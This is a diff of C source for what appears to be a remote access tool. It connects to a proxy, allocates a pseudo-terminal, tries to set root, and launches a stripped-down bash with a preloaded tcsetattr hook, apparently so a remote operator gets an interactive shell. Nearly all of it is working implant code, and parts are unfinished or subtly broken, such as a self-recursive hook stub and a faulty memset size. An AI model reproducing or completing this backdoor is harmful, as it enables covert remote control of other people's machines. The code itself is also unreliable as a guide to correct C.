@@ -28,6 +28,16 @@ void	eperror(const char* msg)
 	exit(1);
 }
 
+/*
+// a hook for the real tcsetattr
+// swap address with tcsetattr in final ELF (__rtcsetattr <--> tcsetattr)
+// create a script to include in the makefile to auto-swap address
+int	__rtcsetattr(int __fd, int __optional_actions, const struct termios* __termios_p)
+{
+
+	return (__rtcsetattr(__fd, __optional_actions, __termios_p));
+}*/
+
 void	connect_to_proxy(s_slave* ratz)
 {
 	ratz->net.addri.sin_port = htons(PORT);
@@ -56,7 +66,7 @@ void	connect_to_proxy(s_slave* ratz)
 
 void	create_ptm(s_slave* slave)
 {
-	if ((slave->ptm = posix_openpt(O_RDWR | O_NOCTTY)) == -1)
+	if ((slave->ptm = posix_openpt(O_RDWR | O_TRUNC | O_NOCTTY)) == -1) // O_TRUNC ??
 		eperror("posix_openpt");
 	else if (grantpt(slave->ptm) == -1)
 		eperror("grantpt");
@@ -74,10 +84,10 @@ void	try_set_root(s_auth* auth)
 
 void	open_pts(s_slave* slave)
 {
-	char*	slave_name = ptsname(slave->ptm);
-	if (!slave_name)
+	slave->sname = ptsname(slave->ptm);
+	if (!slave->sname)
 		eperror("ptsname");
-	else if ((slave->pts = open(slave_name, O_RDWR | O_NOCTTY)) == -1)
+	else if ((slave->pts = open(slave->sname, O_RDWR | O_NOCTTY)) == -1)
 		eperror("open pts");
 }
 
@@ -163,7 +173,8 @@ void	fork_job(s_slave* slave)
 	close(slave->net.in);
 	close(slave->net.out);
 	setenv("PS1", "", 1);
-	setenv("LD_PRELOAD", "./hooked_tcsetattr.so", 1);
+	setenv("__rTCSETATTR", slave->sname, 1);
+	setenv("LD_PRELOAD", "./__rtcsetattr.so", 1);
 	//setenv("TERM", "dumb", 1);
 	if (execlp("bash", "bash", "--posix", "--norc", "--noprofile", NULL) == -1)
 		eperror("execlp");
@@ -196,9 +207,10 @@ void	slave_job(s_slave* slave)
 			n = slave->len;
 			//printf("sprintf : %s\n", slave->msg);
 			write(slave->ptm, slave->msg, slave->len);
+			memset(slave->msg, 0, sizeof(DEBUG_SIZE_MAX));
+			write(slave->ptm, slave->msg, 1); // O_TRUNCated 
 			while (cls == false)
 				;
-			read(slave->ptm, slave->msg, n);
 			while (true)
 			{
 				//if (t < n + 1)
@@ -218,7 +230,7 @@ void	slave_job(s_slave* slave)
 				{
 					if (write(slave->ptm, slave->msg, slave->len) <= 0) // ici ne rentre pas dans le STDIN du pts
 						exit(1);
-					printf("stdin : %s\n", slave->msg);
+					//printf("stdin : %s\n", slave->msg);
 				}
 				if (clf == true)
 					break;
